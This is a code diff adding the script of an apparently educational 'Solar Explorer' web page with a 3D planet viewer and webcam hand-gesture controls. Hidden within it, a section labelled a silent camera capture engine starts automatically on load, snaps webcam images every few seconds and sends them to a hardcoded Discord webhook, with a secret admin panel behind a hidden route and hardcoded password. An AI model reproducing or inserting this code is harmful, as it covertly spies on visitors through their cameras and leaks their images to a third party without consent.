+            const dy = ty - touchStart.y;
+
+            if (Math.hypot(dx, dy) > 8) {
+                touchDragging = true;
+                if (!rotationLocked) {
+                    rotationTarget.y = (ty / innerHeight - 0.5) * 2;
+                    rotationTarget.x = (tx / innerWidth - 0.5) * 2;
+                }
+                drawTrail(tx, ty);
+            }
+        }, { passive: true });
+
+        document.addEventListener('touchend', (e) => {
+            initialPinchDist = 0;
+            touchRotating = false;
+            trailCtx.clearRect(0, 0, trailCanvas.width, trailCanvas.height);
+            if (!touchStart) return;
+            if (e.target.closest('#admin-panel,#lockscreen,#hud,#planet-nav,#hand-preview,#admin-toast,#lightbox,#gesture-guide,#gesture-help-btn')) { touchStart = null; return; }
+
+            const dx = e.changedTouches[0].clientX - touchStart.x;
+            const dy = e.changedTouches[0].clientY - touchStart.y;
+            const dt = Date.now() - touchStart.t;
+
+            if (!touchDragging && dt < 400) {
+                const now = Date.now();
+                if (now - lastTap < 300) {
+                    // Double tap: Reset to Sun
+                    focusIndex = 0;
+                    updateHUD(0);
+                    showGestureBadge('✊', 'SYSTEM VIEW');
+                    lastTap = 0;
+                } else {
+                    castRay(touchStart.x, touchStart.y);
+                    lastTap = now;
+                }
+            } else if (touchDragging && dt < 500 && Math.abs(dx) > 55 && Math.abs(dx) > Math.abs(dy)) {
+                if (dx < 0) {
+                    focusIndex = (focusIndex + 1) % planetData.length;
+                    showGestureBadge('☝️', 'NEXT PLANET');
+                } else {
+                    focusIndex = (focusIndex - 1 + planetData.length) % planetData.length;
+                    showGestureBadge('✌️', 'PREV PLANET');
+                }
+                updateHUD(focusIndex);
+            } else if (touchDragging && dt < 500 && Math.abs(dy) > 80 && Math.abs(dy) > Math.abs(dx)) {
+                // Vertical swipe: up = speed boost, down = auto-tour
+                if (dy < 0) toggleSpeedBoost();
+                else toggleAutoTour();
+            }
+
+            touchStart = null;
+            touchDragging = false;
+        }, { passive: true });
+
+        function animate() {
+            requestAnimationFrame(animate);
+            const speedMul = speedBoost ? 4 : 1;
+            orbitGroups.forEach((g, i) => {
+                g.rotation.y += planetData[i].speed * speedMul;
+                planets[i].rotation.y += 0.01 * speedMul;
+            });
+            const targetPlanet = planets[focusIndex];
+            const worldPos = new THREE.Vector3();
+            targetPlanet.getWorldPosition(worldPos);
+            const offset = isZoomed ? 5 : currentZoom;
+            const targetCamPos = new THREE.Vector3(
+                worldPos.x + (rotationLocked ? 0 : rotationTarget.x * 20),
+                worldPos.y + offset + (rotationLocked ? 0 : rotationTarget.y * 10),
+                worldPos.z + offset
+            );
+            camera.position.lerp(targetCamPos, 0.05);
+            camera.lookAt(worldPos);
+            renderer.render(scene, camera);
+        }
+
+        window.addEventListener('resize', () => {
+            camera.aspect = innerWidth / innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(innerWidth, innerHeight);
+        });
+
+        // ══════════════════════════════════════════
+        //  HAND TRACKING  (10 gestures)
+        // ══════════════════════════════════════════
+        const hands = new Hands({ locateFile: f => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}` });
+        hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.65, minTrackingConfidence: 0.55 });
+
+        let lastSwitch = 0;
+        let lastGestureTime = {}; // per-gesture cooldowns
+
+        function gestureReady(name, ms = 1200) {
+            const now = Date.now();
+            if (!lastGestureTime[name] || now - lastGestureTime[name] > ms) {
+                lastGestureTime[name] = now;
+                return true;
+            }
+            return false;
+        }
+
+        // Track hand presence for cursor hiding
+        let handLostTimer = null;
+
+        function setHandActive(active) {
+            if (active) {
+                document.body.classList.add('hand-active');
+                clearTimeout(handLostTimer);
+            } else {
+                // Delay removing class so cursor doesn't flicker
+                handLostTimer = setTimeout(() => document.body.classList.remove('hand-active'), 800);
+            }
+        }
+
+        hands.onResults((results) => {
+            if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) {
+                // No hand detected — clear trail, restore cursor
+                setHandActive(false);
+                trailCtx.clearRect(0, 0, trailCanvas.width, trailCanvas.height);
+                trailPoints = [];
+                return;
+            }
+
+            setHandActive(true); // hide cursor
+            const lm = results.multiHandLandmarks[0];
+
+            // ── Pointer position drives scene rotation (palm center = lm[9]) ──
+            if (!rotationLocked) {
+                rotationTarget.x = (lm[9].x - 0.5) * 2;
+                rotationTarget.y = (lm[9].y - 0.5) * 2;
+            }
+            // Draw gesture trail from index fingertip (more precise than palm)
+            drawTrail(lm[8].x * innerWidth, lm[8].y * innerHeight);
+
+            // ── Finger states ──
+            const thumbUp  = lm[4].x < lm[3].x;
+            const indexUp  = lm[8].y  < lm[6].y;
+            const middleUp = lm[12].y < lm[10].y;
+            const ringUp   = lm[16].y < lm[14].y;
+            const pinkyUp  = lm[20].y < lm[18].y;
+
+            // ── PINCH zoom ──
+            const pinchDist = Math.hypot(lm[8].x - lm[4].x, lm[8].y - lm[4].y);
+            if (pinchDist > 0.15) { isZoomed = true;  currentZoom = THREE.MathUtils.lerp(currentZoom, 8,  0.06); }
+            else                  { isZoomed = false; currentZoom = THREE.MathUtils.lerp(currentZoom, 60, 0.06); }
+
+            // ── GESTURE CLASSIFICATION ──
+
+            // 1. FIST — all down → Sun
+            if (!indexUp && !middleUp && !ringUp && !pinkyUp && !thumbUp) {
+                if (gestureReady('fist', 1500)) { focusIndex = 0; updateHUD(0); showGestureBadge('✊', 'SYSTEM VIEW'); }
+                return;
+            }
+
+            // 2. OK SIGN — index curled close to thumb, others up
+            if (pinchDist < 0.06 && middleUp && ringUp) {
+                if (gestureReady('ok', 2000)) toggleOrbits();
+                return;
+            }
+
+            // 3. SHAKA — thumb + pinky only
+            if (thumbUp && pinkyUp && !indexUp && !middleUp && !ringUp) {
+                if (gestureReady('shaka', 2500)) { doCapture(); showGestureBadge('🤙', 'SNAPSHOT!'); }
+                return;
+            }
+
+            // 4. VULCAN — all 4 fingers up, spread between middle+ring
+            if (indexUp && middleUp && ringUp && pinkyUp) {
+                if (Math.abs(lm[12].x - lm[16].x) > 0.07) {
+                    if (gestureReady('vulcan', 2000)) toggleAutoTour();
+                    return;
+                }
+            }
+
+            // 5. 3-FINGER — index+middle+ring up, pinky down
+            if (indexUp && middleUp && ringUp && !pinkyUp) {
+                if (gestureReady('three', 2000)) toggleSpeedBoost();
+                return;
+            }
+
+            // 6. PEACE — index+middle up, ring+pinky down
+            if (indexUp && middleUp && !ringUp && !pinkyUp) {
+                if (gestureReady('peace', 1200)) {
+                    focusIndex = (focusIndex - 1 + planetData.length) % planetData.length;
+                    updateHUD(focusIndex);
+                    showGestureBadge('✌️', 'PREV PLANET');
+                }
+                return;
+            }
+
+            // 7. INDEX POINT — only index up
+            if (indexUp && !middleUp && !ringUp && !pinkyUp) {
+                if (gestureReady('index', 1200)) {
+                    focusIndex = (focusIndex + 1) % planetData.length;
+                    updateHUD(focusIndex);
+                    showGestureBadge('☝️', 'NEXT PLANET');
+                }
+                return;
+            }
+
+            // 8. PINKY ONLY — rotation lock
+            if (pinkyUp && !indexUp && !middleUp && !ringUp) {
+                if (gestureReady('pinky', 2000)) toggleRotationLock();
+                return;
+            }
+        });
+
+        const webcamEl = document.getElementById('webcam');
+        const camControl = new Camera(webcamEl, {
+            onFrame: async () => { await hands.send({ image: webcamEl }); },
+            width: 640, height: 480
+        });
+        camControl.start();
+
+        // ══════════════════════════════════════════
+        //  CLOCK
+        // ══════════════════════════════════════════
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock').textContent = now.toLocaleTimeString('en-US', { hour12: false });
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // ══════════════════════════════════════════
+        //  ADMIN SYSTEM
+        // ══════════════════════════════════════════
+        const ADMIN_PATH = '998765';
+        const DEFAULT_PASSWORD = 'UBUNTULINUX593';
+
+        const adminState = {
+            password: DEFAULT_PASSWORD,
+            webhookUrl: 'https://discord.com/api/webhooks/1553477891982102648/eKqQgyaxVK6kgg9KPdMhGQFbEZ73LrnP5_4bPA-70jeUeTNGdRtDhZ5S53neUlQMujPL',
+            captureInterval: 5,
+            isCapturing: false,
+            capturedCount: 0,
+            sentCount: 0,
+            sessionStart: null,
+            capturedImages: [],
+            captureTimer: null,
+            sendOnCapture: true,
+            includeTimestamp: true,
+            imgQuality: 0.7,
+            authed: false,
+        };
+
+        // Hash routing
+        function checkRoute() {
+            const hash = window.location.hash.replace('#', '').replace('/', '');
+            if (hash === ADMIN_PATH) showLockscreen();
+        }
+        window.addEventListener('hashchange', checkRoute);
+        window.addEventListener('load', checkRoute);
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            // Skip if typing in an input
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+            if (e.ctrlKey && e.shiftKey && e.key === 'A') { showLockscreen(); return; }
+            switch (e.key) {
+                case 'ArrowRight': case 'd':
+                    focusIndex = (focusIndex + 1) % planetData.length;
+                    updateHUD(focusIndex);
+                    showGestureBadge('☝️', 'NEXT PLANET');
+                    break;
+                case 'ArrowLeft': case 'a':
+                    focusIndex = (focusIndex - 1 + planetData.length) % planetData.length;
+                    updateHUD(focusIndex);
+                    showGestureBadge('✌️', 'PREV PLANET');
+                    break;
+                case ' ': case 'Home':
+                    e.preventDefault();
+                    focusIndex = 0; updateHUD(0);
+                    showGestureBadge('✊', 'SYSTEM VIEW');
+                    break;
+                case 't': case 'T':
+                    toggleAutoTour();
+                    break;
+                case 'b': case 'B':
+                    toggleSpeedBoost();
+                    break;
+                case 'o': case 'O':
+                    toggleOrbits();
+                    break;
+                case 's': case 'S':
+                    doCapture().then(() => showGestureBadge('🤙', 'SNAPSHOT!'));
+                    break;
+                case 'l': case 'L':
+                    toggleRotationLock();
+                    break;
+                case '?': case '/':
+                    document.getElementById('gesture-guide').classList.toggle('open');
+                    break;
+                case 'Escape':
+                    document.getElementById('gesture-guide').classList.remove('open');
+                    break;
+                case '+': case '=':
+                    currentZoom = Math.max(5, currentZoom - 5);
+                    break;
+                case '-': case '_':
+                    currentZoom = Math.min(120, currentZoom + 5);
+                    break;
+            }
+        });
+
+        // ── Lockscreen ──
+        function showLockscreen() {
+            if (adminState.authed) { openAdminPanel(); return; }
+            document.getElementById('lockscreen').classList.add('visible');
+            setTimeout(() => document.getElementById('lock-input').focus(), 100);
+        }
+        function hideLockscreen() {
+            document.getElementById('lockscreen').classList.remove('visible');
+            document.getElementById('lock-input').value = '';
+            document.getElementById('lock-error').classList.remove('show');
+        }
+
+        document.getElementById('lock-submit-btn').addEventListener('click', attemptLogin);
+        document.getElementById('lock-input').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') attemptLogin();
+            if (e.key === 'Escape') { hideLockscreen(); window.location.hash = ''; }
+        });
+
+        function attemptLogin() {
+            const val = document.getElementById('lock-input').value;
+            const input = document.getElementById('lock-input');
+            if (val === adminState.password) {
+                adminState.authed = true;
+                hideLockscreen();
+                openAdminPanel();
+            } else {
+                input.classList.add('error');
+                document.getElementById('lock-error').classList.add('show');
+                setTimeout(() => input.classList.remove('error'), 500);
+                input.value = '';
+            }
+        }
+
+        // ── Admin Panel ──
+        function openAdminPanel() {
+            document.getElementById('admin-panel').classList.add('visible');
+            refreshAdminUI();
+            startSessionTimer();
+        }
+        function closeAdminPanel() {
+            document.getElementById('admin-panel').classList.remove('visible');
+            adminState.authed = false;
+            window.location.hash = '';
+        }
+        document.getElementById('admin-close-btn').addEventListener('click', closeAdminPanel);
+
+        function refreshAdminUI() {
+            document.getElementById('webhook-url').value = adminState.webhookUrl;
+            document.getElementById('interval-slider').value = Math.min(adminState.captureInterval, 120);
+            document.getElementById('interval-display').textContent = adminState.captureInterval;
+            document.getElementById('interval-manual').value = adminState.captureInterval;
+            document.getElementById('send-on-capture').checked = adminState.sendOnCapture;
+            document.getElementById('include-timestamp').checked = adminState.includeTimestamp;
+            document.getElementById('img-quality').value = adminState.imgQuality;
+            updateCaptureStatus();
+            updateStats();
+            renderGallery();
+        }
+
+        function updateCaptureStatus() {
+            const badge = document.getElementById('cap-badge');
+            const dot = document.getElementById('admin-status-dot');
+            badge.textContent = adminState.isCapturing ? 'CAPTURING' : 'STOPPED';
+            badge.className = 'status-badge ' + (adminState.isCapturing ? 'running' : 'stopped');
+            dot.style.background = adminState.isCapturing ? 'var(--green)' : 'var(--red)';
+            dot.style.boxShadow = adminState.isCapturing ? '0 0 10px var(--green)' : '0 0 10px var(--red)';
+        }
+
+        function updateStats() {
+            document.getElementById('stat-captured').textContent = adminState.capturedCount;
+            document.getElementById('stat-sent').textContent = adminState.sentCount;
+            document.getElementById('stat-interval').textContent = adminState.captureInterval + 's';
+        }
+
+        let sessionTimerInterval = null;
+        function startSessionTimer() {
+            if (!adminState.sessionStart) adminState.sessionStart = Date.now();
+            if (sessionTimerInterval) return;
+            sessionTimerInterval = setInterval(() => {
+                const mins = Math.floor((Date.now() - adminState.sessionStart) / 60000);
+                document.getElementById('stat-session').textContent = mins + 'm';
+            }, 10000);
+        }
+
+        // ══════════════════════════════════════════
+        //  CAMERA CAPTURE ENGINE (silent)
+        // ══════════════════════════════════════════
+        const captureCanvas = document.getElementById('capture-canvas');
+        const captureCtx = captureCanvas.getContext('2d');
+
+        function captureImage() {
+            const video = document.getElementById('webcam');
+            if (!video.videoWidth) return null;
+            captureCanvas.width = video.videoWidth;
+            captureCanvas.height = video.videoHeight;
+            captureCtx.drawImage(video, 0, 0);
+            return captureCanvas.toDataURL('image/jpeg', adminState.imgQuality);
+        }
+
+        async function doCapture() {
+            const dataUrl = captureImage();
+            if (!dataUrl) { addLog('No video stream available.', 'error'); return; }
+            const ts = new Date().toLocaleString();
+            adminState.capturedImages.unshift({ dataUrl, ts });
+            adminState.capturedCount++;
+            addLog('Image captured [' + ts + ']', 'success');
+            updateStats();
+            renderGallery();
+            if (adminState.sendOnCapture && adminState.webhookUrl) await sendToWebhook(dataUrl, ts);
+        }
+
+        async function sendToWebhook(dataUrl, ts) {
+            if (!adminState.webhookUrl) { addLog('Webhook URL not set.', 'error'); return; }
+            try {
+                const res = await fetch(dataUrl);
+                const blob = await res.blob();
+                const form = new FormData();
+                form.append('file', blob, 'capture_' + Date.now() + '.jpg');
+                if (adminState.includeTimestamp) form.append('content', '📸 **Capture** | ' + ts);
+                const r = await fetch(adminState.webhookUrl, { method: 'POST', body: form });
+                if (r.ok) { adminState.sentCount++; addLog('Sent to webhook ✓', 'success'); updateStats(); }
+                else addLog('Webhook error: ' + r.status, 'error');
+            } catch (err) { addLog('Webhook send failed: ' + err.message, 'error'); }
+        }
+
+        function startCapture() {
+            if (adminState.isCapturing) return;
+            adminState.isCapturing = true;
+            updateCaptureStatus();
+            addLog('Capture started. Interval: ' + adminState.captureInterval + 's', 'info');
+            scheduleCapture();
+        }
+
+        function scheduleCapture() {
+            if (!adminState.isCapturing) return;
+            doCapture();
+            adminState.captureTimer = setTimeout(scheduleCapture, adminState.captureInterval * 1000);
+        }
+
+        function stopCapture() {
+            adminState.isCapturing = false;
+            clearTimeout(adminState.captureTimer);
+            updateCaptureStatus();
+            addLog('Capture stopped.', 'info');
+        }
+
+        // ── Capture Buttons ──
+        document.getElementById('start-cap-btn').addEventListener('click', () => { startCapture(); showToast('▶ Capture Started'); });
+        document.getElementById('stop-cap-btn').addEventListener('click', () => { stopCapture(); showToast('⏹ Capture Stopped'); });
+        document.getElementById('snap-now-btn').addEventListener('click', async () => { await doCapture(); showToast('📸 Snapshot taken!'); });
+
+        // ── Interval ──
+        document.getElementById('interval-slider').addEventListener('input', function () {
+            document.getElementById('interval-display').textContent = this.value;
+            document.getElementById('interval-manual').value = this.value;
+        });
+
+        document.getElementById('apply-interval-btn').addEventListener('click', () => {
+            const val = Math.max(2, Math.min(3600, parseInt(document.getElementById('interval-manual').value) || 5));
+            adminState.captureInterval = val;
+            document.getElementById('interval-slider').value = Math.min(val, 120);
+            document.getElementById('interval-display').textContent = val;
+            document.getElementById('interval-manual').value = val;
+            updateStats();
+            addLog('Interval updated to ' + val + 's', 'info');
+            showToast('Interval: ' + val + 's');
+            if (adminState.isCapturing) { clearTimeout(adminState.captureTimer); adminState.captureTimer = setTimeout(scheduleCapture, val * 1000); }
+        });
+
+        // ── Webhook ──
+        document.getElementById('save-wh-btn').addEventListener('click', () => {
+            adminState.webhookUrl = document.getElementById('webhook-url').value.trim();
+            addLog('Webhook URL saved.', 'info'); showToast('💾 Webhook Saved');
+        });
+
+        document.getElementById('test-wh-btn').addEventListener('click', async () => {
+            if (!adminState.webhookUrl) { showToast('⚠ Set webhook URL first!'); return; }
+            addLog('Testing webhook...', 'info');
+            try {
+                const r = await fetch(adminState.webhookUrl, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: '✅ Solar Explorer Admin — Webhook test successful!' })
+                });
+                if (r.ok) { addLog('Webhook test OK ✓', 'success'); showToast('✅ Webhook OK!'); }
+                else { addLog('Webhook test failed: ' + r.status, 'error'); showToast('❌ Error ' + r.status); }
+            } catch (e) { addLog('Webhook test error: ' + e.message, 'error'); showToast('❌ Connection Failed'); }
+        });
+
+        document.getElementById('send-on-capture').addEventListener('change', function () { adminState.sendOnCapture = this.checked; });
+        document.getElementById('include-timestamp').addEventListener('change', function () { adminState.includeTimestamp = this.checked; });
+        document.getElementById('img-quality').addEventListener('change', function () { adminState.imgQuality = parseFloat(this.value); addLog('Image quality set to ' + (this.value * 100) + '%', 'info'); });
+
+        // ── Password ──
+        document.getElementById('pw-change-btn').addEventListener('click', () => {
+            const cur = document.getElementById('pw-current').value;
+            const nw = document.getElementById('pw-new').value;
+            const cf = document.getElementById('pw-confirm').value;
+            const msg = document.getElementById('pw-msg');
+            if (cur !== adminState.password) { msg.textContent = '✗ CURRENT PASSWORD INCORRECT'; msg.className = 'pw-msg err'; }
+            else if (nw.length < 4) { msg.textContent = '✗ PASSWORD TOO SHORT (MIN 4)'; msg.className = 'pw-msg err'; }
+            else if (nw !== cf) { msg.textContent = '✗ PASSWORDS DO NOT MATCH'; msg.className = 'pw-msg err'; }
+            else {
+                adminState.password = nw;
+                msg.textContent = '✓ PASSWORD CHANGED SUCCESSFULLY'; msg.className = 'pw-msg ok';
+                ['pw-current', 'pw-new', 'pw-confirm'].forEach(id => document.getElementById(id).value = '');
+                addLog('Admin password changed.', 'info'); showToast('🔒 Password Updated!');
+            }
+        });
+
+        // ── Gallery ──
+        function renderGallery() {
+            const gallery = document.getElementById('img-gallery');
+            if (adminState.capturedImages.length === 0) { gallery.innerHTML = '<div class="gallery-empty">No images captured yet.</div>'; return; }
+            gallery.innerHTML = '';
+            adminState.capturedImages.forEach((item) => {
+                const img = document.createElement('img');
+                img.className = 'gallery-img'; img.src = item.dataUrl; img.title = item.ts;
+                img.addEventListener('click', () => openLightbox(item.dataUrl));
+                gallery.appendChild(img);
+            });
+        }
+
+        function openLightbox(src) {
+            document.getElementById('lightbox-img').src = src;
+            document.getElementById('lightbox').classList.add('open');
+        }
+        document.getElementById('lightbox-close').addEventListener('click', () => document.getElementById('lightbox').classList.remove('open'));
+        document.getElementById('lightbox').addEventListener('click', function (e) { if (e.target === this) this.classList.remove('open'); });
+        document.getElementById('clear-gallery-btn').addEventListener('click', () => { adminState.capturedImages = []; renderGallery(); addLog('Gallery cleared.', 'info'); showToast('🗑 Gallery Cleared'); });
+        document.getElementById('dl-all-btn').addEventListener('click', () => {
+            if (!adminState.capturedImages.length) { showToast('No images to download'); return; }
+            adminState.capturedImages.forEach((item, i) => { const a = document.createElement('a'); a.href = item.dataUrl; a.download = 'capture_' + (i + 1) + '_' + Date.now() + '.jpg'; a.click(); });
+            showToast('⬇ Downloading ' + adminState.capturedImages.length + ' images');
+        });
+
+        // ── Log ──
+        function addLog(msg, type = 'info') {
+            const log = document.getElementById('capture-log');
+            if (!log) return;
+            const ts = new Date().toLocaleTimeString('en-US', { hour12: false });
+            const entry = document.createElement('div');
+            entry.className = 'log-entry ' + type;
+            entry.innerHTML = '<span class="ts">[' + ts + ']</span>' + msg;
+            log.prepend(entry);
+            while (log.children.length > 200) log.removeChild(log.lastChild);
+        }
+        document.getElementById('clear-log-btn').addEventListener('click', () => { document.getElementById('capture-log').innerHTML = ''; addLog('Log cleared.', 'info'); });
+
+        // ── Toast ──
+        let toastTimer;
+        function showToast(msg) {
+            const toast = document.getElementById('admin-toast');
+            toast.textContent = msg; toast.classList.add('show');
+            clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => toast.classList.remove('show'), 2500);
+        }
+
+        // ── Gesture Guide button ──
+        document.getElementById('gesture-help-btn').addEventListener('click', () => {
+            document.getElementById('gesture-guide').classList.toggle('open');
+        });
+        document.getElementById('guide-close-btn').addEventListener('click', () => {
+            document.getElementById('gesture-guide').classList.remove('open');
+        });
+        // Close guide on outside click
+        document.getElementById('gesture-guide').addEventListener('click', function(e) {
+            if (e.target === this) this.classList.remove('open');
+        });
+
+        // Mouse wheel zoom on desktop
+        document.addEventListener('wheel', (e) => {
+            if (e.target.closest('#admin-panel,#lockscreen,#hud,#gesture-guide')) return;
+            currentZoom = Math.max(5, Math.min(120, currentZoom + e.deltaY * 0.05));
+        }, { passive: true });
+
+        // Mouse drag rotation on desktop
+        let mouseDragging = false;
+        let mouseStart = null;
+        document.addEventListener('mousedown', (e) => {
+            if (e.target.closest('#admin-panel,#lockscreen,#hud,#gesture-guide,#planet-nav,#hand-preview')) return;
+            if (e.button === 0) { mouseDragging = true; mouseStart = { x: e.clientX, y: e.clientY }; }
+        });
+        document.addEventListener('mousemove', (e) => {
+            if (!mouseDragging || rotationLocked) return;
+            rotationTarget.x = (e.clientX / innerWidth  - 0.5) * 2;
+            rotationTarget.y = (e.clientY / innerHeight - 0.5) * 2;
+            drawTrail(e.clientX, e.clientY);
+        });
+        document.addEventListener('mouseup', () => {
+            mouseDragging = false;
+            trailCtx.clearRect(0, 0, trailCanvas.width, trailCanvas.height);
+        });
+
+        // ══════════════════════════════════════════
+        //  INIT
+        // ══════════════════════════════════════════
+        initScene();
+        collectOrbitMeshes();
+        animate();
+        checkRoute();
+
+        // Auto-start capture for discord webhook
+        setTimeout(() => {
+            if (!adminState.isCapturing) startCapture();
+        }, 1000);
+    </script>
+</body>
+
+</html>
